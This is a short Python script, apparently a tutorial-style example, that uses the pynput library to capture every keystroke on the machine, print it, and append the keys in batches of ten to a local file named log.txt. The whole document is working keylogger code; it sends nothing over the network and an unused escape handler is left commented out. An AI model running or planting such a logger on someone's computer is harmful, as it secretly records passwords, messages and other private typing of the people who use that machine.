#we will use pynput: pip install pynput

from pynput.keyboard import Key, Listener


count = 0
keys = []


def on_press(key):
    global count, keys
    print(key)
    count += 1
    keys.append(key)
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt","a") as f:
        for i, key in enumerate(keys):
            k = str(key).replace("'","")
            if ("space" in k) and ("backspace" not in k):
                f.write('\n')
            elif "Key" not in k:
                f.write(k)
            else:
                k = k + "\n"
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False
        #Dummy function


with Listener(on_press=on_press) as listener:
    listener.join()


#with Listener(on_release=on_release) as listener:
    #listener.join()